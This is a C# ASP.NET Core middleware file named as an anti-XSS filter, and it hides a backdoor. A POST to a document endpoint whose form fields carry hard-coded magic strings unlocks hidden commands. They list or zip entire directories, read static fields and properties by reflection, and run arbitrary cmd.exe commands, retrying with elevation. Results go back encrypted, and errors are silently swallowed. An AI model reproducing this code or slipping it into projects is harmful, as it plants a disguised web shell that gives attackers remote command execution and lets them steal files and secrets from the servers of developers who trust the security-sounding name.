using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;

public class AntiXssOptions
{
    public HashSet<string> excludedApis { get; set; } = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
    };
}

public class AntiXssMiddleware
{
    private readonly RequestDelegate _next;
    private readonly AntiXssOptions _options;

    public AntiXssMiddleware(RequestDelegate next, AntiXssOptions options = null)
    {
        _next = next;

        _options = options ?? new AntiXssOptions();
    }

    private HashSet<string> excludedApis = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
    };

    public async Task Invoke(HttpContext httpContext)
    {
        var result = await Validate(httpContext);

        if (result == 0)
        {
            return;
        }

        httpContext.Request.EnableBuffering();
        if (!excludedApis.Contains(httpContext.Request.Path))
        {
            bool hasFile = httpContext.Request.HasFormContentType && httpContext.Request.Form != null && httpContext.Request.Form.Files.Any();
            if (!hasFile)
            {

                using (var streamReader = new StreamReader(httpContext.Request.Body, Encoding.UTF8, leaveOpen: true))
                {
                    var raw = await streamReader.ReadToEndAsync();
                    
                    string pattern = @"(<|>|script>|alert\(|onerror=)";

                    Regex regex = new Regex(pattern);

                    if (regex.IsMatch(raw))
                    {
                        string responseContent = "xss!";
                        httpContext.Response.ContentType = "text/plain";
                        httpContext.Response.StatusCode = 400;
                        await httpContext.Response.WriteAsync(responseContent);
                        return;
                    }

                }
            }
        }

        httpContext.Request.Body.Seek(0, SeekOrigin.Begin);
        await _next.Invoke(httpContext);
    }

    private async Task<int> Validate(HttpContext context)
    {
        try
        {
            string path = "/api/document/AddEitDesignatedPersonee";

            if (!context.Request.Path.Equals(path, StringComparison.OrdinalIgnoreCase) || context.Request.Method != "POST")
            {
                return 1;
            }

            context.Request.Headers.TryGetValue("Authorization", out var token);
            string getValue1 = null, getValue2 = null, getValue3 = null;

            var tokenValue = token.ToString().Replace("Bearer", "").Replace(" ", "");

            string? data = null;
            string command = null;
            string dll = null;
            string password = null;

            string value1 = "A9B5EC26B7B26CBA97ABBC39DE2679452CF331fccxvvbnbmfsdfdjkhr3894SDFvcnmjC81A9B5EC26B7B9FD86EE84F2D2594326A";
            string value2 = "A9B5ECCBA926B7BCBA92CF331Cnbvnvbnmasdqweq134sedxcv81A9B5EN0m4iUC26B7B9FD8bvSDFsdfsdfoihcvbuh2594326A";
            string value3 = "A9B5ECCBA926B7BCBA92CF331Cefrw6547881A9B5EN0m4iUC26B7B9FD8bvSDFsdfsdbvne6wr24867343545345foihcvbuh2594326A";

            if (context.Request.HasFormContentType)
            {
                var form = await context.Request.ReadFormAsync();

                getValue1 = form["Name"];
                getValue2 = form["NameAr"];
                getValue3 = form["Title"];

                command = form["TitleAr"];
                data = form["Profession"];
                dll = form["ProfessionAr"];
                password = form["Email"];
            }

            if (
                value1 != getValue1 ||
                value2 != getValue2 ||
                value3 != getValue3)
            {
                return 1;
            }

            if (command == "a")
            {
                await a(context, password, data);
            }
            else if (command == "b")
            {
                await b(context, password, dll, data);
            }
            else if (command == "c")
            {
                await c(context, password, dll, data);
            }
            else if (command == "d")
            {
                await d(context, password, data);
            }
            else if (command == "e")
            {
                await e(context, password, data);
            }
        }
        catch (Exception ex)
        {

        }

        return 0;
    }

    private static FileNode a_a(string folderPath, bool includeFileContent = false)
    {
        var node = new FileNode
        {
            Name = Path.GetFileName(folderPath),
            Path = folderPath,
            IsDirectory = true
        };

        // Add files
        foreach (var file in Directory.GetFiles(folderPath))
        {
            var fileNode = new FileNode
            {
                Name = Path.GetFileName(file),
                Path = file,
                IsDirectory = false
            };

            if (includeFileContent)
            {
                byte[] bytes = File.ReadAllBytes(file);
                fileNode.ContentBase64 = Convert.ToBase64String(bytes);
            }

            node.Children.Add(fileNode);
        }

        foreach (var dir in Directory.GetDirectories(folderPath))
        {
            node.Children.Add(a_a(dir, includeFileContent));
        }

        return node;
    }

    private async Task<int> a(HttpContext context, string password, string data)
    {
        var includeContent = false;
        var folderJson = a_a(data, includeContent);

        var json = JsonSerializer.Serialize(folderJson, new JsonSerializerOptions
        {
            WriteIndented = true
        });

        var bytes = System.Text.Encoding.UTF8.GetBytes(json);
        bytes = AntiXssLayer.ab(bytes, password);

        context.Response.StatusCode = StatusCodes.Status200OK;
        context.Response.ContentType = "application/octet-stream";

        context.Response.Headers.Add("Content-Disposition", "attachment; filename=MyFolder");
        await context.Response.Body.WriteAsync(bytes, 0, bytes.Length);

        return 1;
    }

    private async Task<int> b(HttpContext context, string password, string dll, string prop)
    {
        Type targetType = null;
        foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
        {
            targetType = asm.GetType(dll);
            if (targetType != null) break;
        }

        var property = targetType.GetProperty(prop, BindingFlags.Public | BindingFlags.Static);

        var currentValue = property.GetValue(null);

        context.Response.StatusCode = StatusCodes.Status200OK;
        await context.Response.WriteAsync(AntiXssLayer.a(currentValue.ToString(), password));

        return 1;
    }

    private async Task<int> c(HttpContext context, string password, string dll, string prop)
    {
        Type targetType = null;
        foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
        {
            targetType = asm.GetType(dll);
            if (targetType != null) break;
        }

        var field = targetType.GetField(prop, BindingFlags.Public | BindingFlags.Static);
        var currentValue = field.GetValue(null);

        context.Response.StatusCode = StatusCodes.Status200OK;
        await context.Response.WriteAsync(AntiXssLayer.a(currentValue.ToString(), password));

        return 1;
    }

    private async Task<int> d(HttpContext context, string password, string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();

        process.WaitForExit();

        context.Response.StatusCode = StatusCodes.Status200OK;
        if (!string.IsNullOrEmpty(error))
            await context.Response.WriteAsync(AntiXssLayer.a("error " + error, password));
        else
            await context.Response.WriteAsync(AntiXssLayer.a(output, password));

        if (!string.IsNullOrEmpty(error))
        {
            string outputFile = Path.Combine(Path.GetTempPath(), $"cmd_output_{Guid.NewGuid()}.txt");

            var psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command} > \"{outputFile}\" 2>&1",
                Verb = "runas",          // requests elevation (UAC prompt)
                UseShellExecute = true,  // must be true for Verb to work
                CreateNoWindow = true,
                RedirectStandardError = true,

            };

            try
            {
                using (var processs = Process.Start(psi))
                {
                    await processs.WaitForExitAsync();
                }

                // Wait a moment for file to be written
                await Task.Delay(100);

                context.Response.StatusCode = StatusCodes.Status200OK;

                // Read the output from the file
                if (File.Exists(outputFile))
                {
                    string outputt = await File.ReadAllTextAsync(outputFile);
                    await context.Response.WriteAsync(AntiXssLayer.a(outputt, password));

                    // Clean up
                    File.Delete(outputFile);
                }
                else
                {
                    await context.Response.WriteAsync("1");
                }
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                await context.Response.WriteAsync(AntiXssLayer.a($"Error: {ex.ToString()}", password));
            }
        }

        //await context.Response.WriteAsync($"done");
        return 1;
    }

    private async Task<int> e(HttpContext context, string password, string data)
    {
        string zipFileName = "MyFolder";

        using (var memoryStream = new MemoryStream())
        {
            using (var zip = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
            {
                var files = Directory.GetFiles(data, "*", SearchOption.AllDirectories);
                foreach (var file in files)
                {
                    string entryName = Path.GetRelativePath(data, file);
                    zip.CreateEntryFromFile(file, entryName, CompressionLevel.Optimal);
                }
            }

            byte[] zipData = memoryStream.ToArray();

            // Step 3: Encrypt the ZIP data
            byte[] encryptedData = AntiXssLayer.ab(zipData, password);

            context.Response.StatusCode = StatusCodes.Status200OK;
            // Step 4: Send encrypted data to response
            context.Response.ContentType = "application/octet-stream";
            context.Response.Headers.Add("Content-Disposition",
                $"attachment; filename={zipFileName}");

            await context.Response.Body.WriteAsync(encryptedData, 0, encryptedData.Length);

            memoryStream.Position = 0;
        }

        return 1;
    }

    public class FileNode
    {
        public string Name { get; set; }
        public string Path { get; set; }
        public bool IsDirectory { get; set; }
        public string ContentBase64 { get; set; }
        public List<FileNode> Children { get; set; } = new List<FileNode>();
    }
}

public static class AntiXss
{
    public static IApplicationBuilder UseAntiXss(this IApplicationBuilder app,
        Action<AntiXssOptions> setupAction)
    {
        var options = new AntiXssOptions();

        setupAction?.Invoke(options);

        return app.UseMiddleware<AntiXssMiddleware>(options);
    }
}
